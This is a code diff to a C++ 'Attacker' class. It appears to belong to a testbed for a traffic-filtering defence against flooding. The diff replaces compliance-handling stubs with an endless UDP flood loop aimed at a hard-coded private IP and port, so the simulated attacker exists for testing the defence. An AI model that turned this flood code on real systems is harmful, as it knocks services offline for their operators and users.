@@ -9,22 +9,25 @@ namespace aitf {
 
     void Attacker::start() {
         printf("IMMA FIRIN MAH LAZOR\n");
-        if (comply == AITF_COMPLIANT) stop_attack();
-        else if (comply == AITF_NONCOMPLIANT) start_attack();
-        else sleep_attack();
+        while (1) {
+            int sock = socket(AF_INET, SOCK_DGRAM, 0);
+            struct sockaddr_in addr;
+            addr.sin_family = AF_INET;
+            // Hard coded victim, deal with it
+            inet_aton("10.4.10.1", &addr.sin_addr);
+            // Choose a random port
+            srand(time(NULL));
+            int port = 5555;
+            addr.sin_port = htons(port);
+            char *msg = "TROLLLLLLOLOLOLOL";
+            int msg_size = strlen(msg);
+            if (sendto(sock, msg, msg_size, 0, (struct sockaddr *) &addr, sizeof(addr)) < 0)
+                printf("Failed to send UDP flood message\n");
+        }
     }
 
     void Attacker::fire_lazor() {
         pthread_create(&attack, NULL, Attacker::start_func, this);
-    }
-
-    void Attacker::start_attack() {
-    }
-
-    void Attacker::stop_attack() {
-    }
-
-    void Attacker::sleep_attack() {
     }
 
     int Attacker::handle_aitf_pkt(struct nfq_q_handle *qh, int pkt_id, unsigned int src_ip, unsigned int dest_ip, AITFPacket *pkt) {
